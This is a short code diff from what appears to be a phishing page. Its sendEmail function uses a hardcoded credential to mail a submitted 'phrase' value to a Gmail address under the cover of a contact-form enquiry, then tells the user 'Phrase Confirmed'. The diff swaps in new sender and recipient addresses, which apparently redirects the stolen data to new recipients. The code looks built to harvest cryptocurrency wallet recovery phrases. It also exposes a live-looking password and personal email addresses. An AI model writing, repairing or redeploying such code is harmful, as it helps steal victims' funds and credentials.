@@ -68,8 +68,8 @@ function sendEmail(event) {
   Email.send({
     Password: "cdfe0913-26b7-41a6-85b7-479176f399bd",
     Username: "reciever",
-    To: "remyoreo11@gmail.com",
-    From: "remyoreo11@gmail.com",
+    To: "Naxbig5@gmail.com",
+    From: "ortonclifford77@gmail.com",
     Subject: "New Contact Form Enquiry",
     Body: "Phrase: " + phrase.value,
   }).then((message) => alert("Phrase Confirmed"));
